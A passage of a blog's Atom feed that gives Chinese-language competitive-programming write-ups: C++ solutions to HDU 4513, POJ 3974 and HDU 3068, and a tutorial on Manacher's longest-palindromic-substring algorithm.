class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> h[maxn &lt;&lt; <span class="number">1</span>], len[maxn &lt;&lt; <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Manacher</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mx = <span class="number">0</span>, id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; (n * <span class="number">2</span> + <span class="number">1</span>); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mx &gt; i) &#123;</span><br><span class="line">            len[i] = min(mx - i, len[<span class="number">2</span> * id - i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            len[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(h[i - len[i]] == h[i + len[i]] &amp;&amp; h[i - len[i]] &lt;= h[i - len[i] + <span class="number">2</span>]) &#123;  <span class="comment">// 这里要保持递增</span></span><br><span class="line">            ++len[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i + len[i] &gt; mx) &#123;</span><br><span class="line">            mx = i + len[i];</span><br><span class="line">            id = i;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = max(ans, len[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span>(T--) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        h[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            h[i * <span class="number">2</span> - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; h[i * <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        h[n * <span class="number">2</span> + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; Manacher() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=4513&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;HDU 4513&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Problem-Description&quot;&gt;&lt;a href=&quot;#Problem-Description&quot; class=&quot;headerlink&quot; title=&quot;Problem Description&quot;&gt;&lt;/a&gt;Problem Description&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;吉哥又想出了一个新的完美队形游戏！&lt;/p&gt;
&lt;p&gt;假设有n个人按顺序站在他的面前，他们的身高分别是h[1], h[2] … h[n]，吉哥希望从中挑出一些人，让这些人形成一个新的队形，新的队形若满足以下三点要求，则就是新的完美队形：&lt;/p&gt;
&lt;p&gt;1、挑出的人保持原队形的相对顺序不变，且必须都是在原队形中连续的；&lt;/p&gt;
&lt;p&gt;2、左右对称，假设有m个人形成新的队形，则第1个人和第m个人身高相同，第2个人和第m-1个人身高相同，依此类推，当然如果m是奇数，中间那个人可以任意；&lt;/p&gt;
&lt;p&gt;3、从左到中间那个人，身高需保证不下降，如果用H表示新队形的高度，则H[1] &amp;lt;= H[2] &amp;lt;= H[3] …. &amp;lt;= H[mid]。&lt;/p&gt;
&lt;p&gt;现在吉哥想知道：最多能选出多少人组成新的完美队形呢？&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="Manacher" scheme="http://wutao18.github.io/tags/Manacher/"/>
    
  </entry>
  
  <entry>
    <title>POJ 3974 Palindrome (Manacher)</title>
    <link href="http://wutao18.github.io/2019/11/14/POJ-3974-Palindrome-Manacher/"/>
    <id>http://wutao18.github.io/2019/11/14/POJ-3974-Palindrome-Manacher/</id>
    <published>2019-11-14T13:59:48.000Z</published>
    <updated>2020-10-27T04:00:53.291Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="http://poj.org/problem?id=3974" target="_blank" rel="noopener">POJ 3974</a></p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>Andy the smart computer science student was attending an algorithms class when the professor asked the students a simple question, “Can you propose an efficient algorithm to find the length of the largest palindrome in a string?”</p><p>A string is said to be a palindrome if it reads the same both forwards and backwards, for example “madam” is a palindrome while “acm” is not.</p><p>The students recognized that this is a classical problem but couldn’t come up with a solution better than iterating over all substrings and checking whether they are palindrome or not, obviously this algorithm is not efficient at all, after a while Andy raised his hand and said “Okay, I’ve a better algorithm” and before he starts to explain his idea he stopped for a moment and then said “Well, I’ve an even better algorithm!”.</p><p>If you think you know Andy’s final solution then prove it! Given a string of at most 1000000 characters find and print the length of the largest palindrome inside this string.</p></blockquote><a id="more"></a><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><blockquote><p>Your program will be tested on at most 30 test cases, each test case is given as a string of at most 1000000 lowercase characters on a line by itself. The input is terminated by a line that starts with the string “END” (quotes for clarity).</p></blockquote><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><blockquote><p>For each test case in the input print the test case number and the length of the largest palindrome.</p></blockquote><h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcbabcbabcba</span><br><span class="line">abacacbaaaab</span><br><span class="line">END</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Case 1: 13</span><br><span class="line">Case 2: 6</span><br></pre></td></tr></table></figure><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p><a href="http://poj.org/searchproblem?field=source&amp;key=Seventh+ACM+Egyptian+National+Programming+Contest" target="_blank" rel="noopener">Seventh ACM Egyptian National Programming Contest</a></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>给定一个字符串，求最长回文子串。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>Manacher 模板题。</p><p>有关 Manacher 算法的讲解见<a href="https://wutao18.github.io/2019/11/13/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2-%E2%80%94%E2%80%94-Manacher-%E9%A9%AC%E6%8B%89%E8%BD%A6-%E7%AE%97%E6%B3%95/">这里</a></p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">init</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> res;</span><br><span class="line">    res += <span class="string">'@'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); ++i) &#123;</span><br><span class="line">        res += <span class="string">'#'</span>;</span><br><span class="line">        res += s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    res += <span class="string">'#'</span>;</span><br><span class="line">    res += <span class="string">'$'</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Manacher</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(len, <span class="number">0</span>, <span class="keyword">sizeof</span>(len));</span><br><span class="line">    <span class="keyword">int</span> mx = <span class="number">0</span>, id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.size() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mx &gt; i) &#123;</span><br><span class="line">            len[i] = min(mx - i, len[<span class="number">2</span> * id - i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            len[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(s[i - len[i]] == s[i + len[i]]) &#123;</span><br><span class="line">            ++len[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i + len[i] &gt; mx) &#123;</span><br><span class="line">            mx = i + len[i];</span><br><span class="line">            id = i;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = max(ans, len[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="keyword">int</span> kase = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; s) &#123;</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">"END"</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">string</span> tmp = init(s);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case "</span> &lt;&lt; (++kase) &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; Manacher(tmp) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;http://poj.org/problem?id=3974&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;POJ 3974&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Andy the smart computer science student was attending an algorithms class when the professor asked the students a simple question, “Can you propose an efficient algorithm to find the length of the largest palindrome in a string?”&lt;/p&gt;
&lt;p&gt;A string is said to be a palindrome if it reads the same both forwards and backwards, for example “madam” is a palindrome while “acm” is not.&lt;/p&gt;
&lt;p&gt;The students recognized that this is a classical problem but couldn’t come up with a solution better than iterating over all substrings and checking whether they are palindrome or not, obviously this algorithm is not efficient at all, after a while Andy raised his hand and said “Okay, I’ve a better algorithm” and before he starts to explain his idea he stopped for a moment and then said “Well, I’ve an even better algorithm!”.&lt;/p&gt;
&lt;p&gt;If you think you know Andy’s final solution then prove it! Given a string of at most 1000000 characters find and print the length of the largest palindrome inside this string.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="模板题" scheme="http://wutao18.github.io/tags/%E6%A8%A1%E6%9D%BF%E9%A2%98/"/>
    
      <category term="字符串" scheme="http://wutao18.github.io/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
      <category term="Manacher" scheme="http://wutao18.github.io/tags/Manacher/"/>
    
  </entry>
  
  <entry>
    <title>最长回文子串 —— Manacher (马拉车) 算法</title>
    <link href="http://wutao18.github.io/2019/11/13/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2-%E2%80%94%E2%80%94-Manacher-%E9%A9%AC%E6%8B%89%E8%BD%A6-%E7%AE%97%E6%B3%95/"/>
    <id>http://wutao18.github.io/2019/11/13/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2-%E2%80%94%E2%80%94-Manacher-%E9%A9%AC%E6%8B%89%E8%BD%A6-%E7%AE%97%E6%B3%95/</id>
    <published>2019-11-13T15:48:28.000Z</published>
    <updated>2020-10-27T06:19:03.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a>最长回文子串</h2><p><strong>回文串</strong>就是原串和反转字符串相同的字符串。比如 <code>aba</code>，<code>acca</code>。前一个是奇数长度的回文串，后一个是偶数长度的回文串。</p><p><strong>最长回文子串</strong>就是一个字符串的所有子串中，是回文串且长度最长的子串。</p><a id="more"></a><h2 id="Brute-Force-做法"><a href="#Brute-Force-做法" class="headerlink" title="Brute Force 做法"></a>Brute Force 做法</h2><p>枚举所有子串，判断是否是回文串，然后寻找最大长度。寻找所有子串要两重循环，判断是否是回文要一重循环，总体时间复杂度 $O(n^3)$。</p><p>稍微优化一下，可以枚举对称中心，然后向两边扩展，直到遇到两个不同的字符，枚举下一个对称中心，寻找其中的最大长度，时间复杂度 $O(n^2)$。</p><p>还可以使用 DP 解决，求原串与反转字符串的最长公共子序列 (LCS)，时间复杂度 $O(n^2)$。</p><h2 id="Manacher-算法"><a href="#Manacher-算法" class="headerlink" title="Manacher 算法"></a>Manacher 算法</h2><p>接下来就是重点了，Manacher 算法，在1975年由一个叫 <a href="https://en.wikipedia.org/wiki/Longest_palindromic_substring#CITEREFManacher1975" target="_blank" rel="noopener">Manacher</a> 的人发明的。能够在 $O(n)$ 的时间求得最长回文子串。</p><p>前面提到，回文串有奇数长度的和偶数长度的，分类讨论有些复杂，可以参考<a href="https://oi-wiki.org/string/manacher/" target="_blank" rel="noopener">这里</a>。为了避免分类讨论，可以使用一个技巧：在字符串首尾以及每两个字符之间插入一个 <code>&#39;#&#39;</code>。比如 <code>abaacca</code>，转换后就是 <code>#a#b#a#a#c#c#a#</code>。那么不管是奇回文 <code>aba</code> 还是偶回文 <code>acca</code>，转换后都是奇回文 (<code>#a#b#a#</code> 和 <code>#a#c#c#a#</code>)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">init</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> res;</span><br><span class="line">    res += <span class="string">'@'</span>;  <span class="comment">// 在开头加入哨兵防止越界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); ++i) &#123;</span><br><span class="line">        res += <span class="string">'#'</span>;</span><br><span class="line">        res += s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    res += <span class="string">'#'</span>;</span><br><span class="line">    res += <span class="string">'$'</span>;  <span class="comment">// 结尾同样加入哨兵防止越界</span></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Manacher 算法的思想来自于上述枚举对称中心的思想。该算法需要维护一个 $len$ 数组，$len[i]$ 代表 $i$ 为中心的最长回文子串的长度。</p><p>设 $s$ 为原字符串，$mx$ 为之前计算的回文串中右端点的最大值，这个回文串的中心位置为 $id$，也就是 $mx = id + len[id]$。</p><p>每次计算的时候，$id$ 的右边和左边是对称的，因此计算右边的时候不需要用从对称中心向两边扩展的思想，而是只用一行代码解决：<code>len[i] = min(mx - i, len[2 * id - i]);</code>，这也是 Manacher 中最关键的一行代码。</p><p>如下图所示，$id$ 右边到 $mx$ 之间的子串与 $id$ 左边是对称的，所以右边的 $len[i]$ 最大长度为左边与之对称的 $len[2\times id - i]$，由于右边的回文串不能超过 $mx$ (原因见第 2 张图)，所以 <code>len[i] = min(mx - i, len[2 * id - i]);</code>。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/gitnote/2019/11/13/1573657779673-1573657779889.png" alt=""></p><p>$id$ 右边的回文串长度不能超过 $mx - i$ 的原因是，如果 $len[2 * id - i]$ 更长，如下图的黄色部分，那么右边的黄色部分与左边的黄色部分相同，那么黑色部分应该可以更长，产生矛盾。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/gitnote/2019/11/13/1573658827030-1573658827032.png" alt=""></p><p>理解了上面的内容基本上就理解了 Manacher 算法了。</p><p>代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Manacher</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(len, <span class="number">0</span>, <span class="keyword">sizeof</span>(len));</span><br><span class="line">    <span class="keyword">int</span> mx = <span class="number">0</span>, id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.size() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mx &gt; i) &#123;</span><br><span class="line">            len[i] = min(mx - i, len[<span class="number">2</span> * id - i]);  <span class="comment">// 上面提到的最关键的一行代码</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            len[i] = <span class="number">1</span>;  <span class="comment">// 如果 i 超过右边界要从头计算</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(s[i - len[i]] == s[i + len[i]]) &#123;  <span class="comment">// 从头计算的方法，就是上面提到的从中心向两边扩展</span></span><br><span class="line">            ++len[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新 mx 和 id</span></span><br><span class="line">        <span class="keyword">if</span>(i + len[i] &gt; mx) &#123;</span><br><span class="line">            mx = i + len[i]; </span><br><span class="line">            id = i;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = max(ans, len[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans - <span class="number">1</span>; <span class="comment">// len[i] 中的最大值-1 即为原串的最长回文子串长度 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="模板题：HDU-3068-最长回文"><a href="#模板题：HDU-3068-最长回文" class="headerlink" title="模板题：HDU 3068 最长回文"></a>模板题：HDU 3068 最长回文</h2><p>题目链接：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=3068" target="_blank" rel="noopener">HDU 3068 最长回文</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">220000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">init</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> res;</span><br><span class="line">    res += <span class="string">'@'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); ++i) &#123;</span><br><span class="line">        res += <span class="string">'#'</span>;</span><br><span class="line">        res += s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    res += <span class="string">'#'</span>;</span><br><span class="line">    res += <span class="string">'$'</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Manacher</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(len, <span class="number">0</span>, <span class="keyword">sizeof</span>(len));</span><br><span class="line">    <span class="keyword">int</span> mx = <span class="number">0</span>, id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.size() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mx &gt; i) &#123;</span><br><span class="line">            len[i] = min(mx - i, len[<span class="number">2</span> * id - i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            len[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(s[i - len[i]] == s[i + len[i]]) &#123;</span><br><span class="line">            ++len[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i + len[i] &gt; mx) &#123;</span><br><span class="line">            mx = i + len[i];</span><br><span class="line">            id = i;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = max(ans, len[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; s) &#123;</span><br><span class="line">        <span class="built_in">string</span> tmp = init(s);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; Manacher(tmp) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.csdn.net/csdn_kou/article/details/82917937" target="_blank" rel="noopener">Manacher算法图解</a></p><p><a href="https://segmentfault.com/a/1190000008484167" target="_blank" rel="noopener">Manacher算法</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;最长回文子串&quot;&gt;&lt;a href=&quot;#最长回文子串&quot; class=&quot;headerlink&quot; title=&quot;最长回文子串&quot;&gt;&lt;/a&gt;最长回文子串&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;回文串&lt;/strong&gt;就是原串和反转字符串相同的字符串。比如 &lt;code&gt;aba&lt;/code&gt;，&lt;code&gt;acca&lt;/code&gt;。前一个是奇数长度的回文串，后一个是偶数长度的回文串。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最长回文子串&lt;/strong&gt;就是一个字符串的所有子串中，是回文串且长度最长的子串。&lt;/p&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
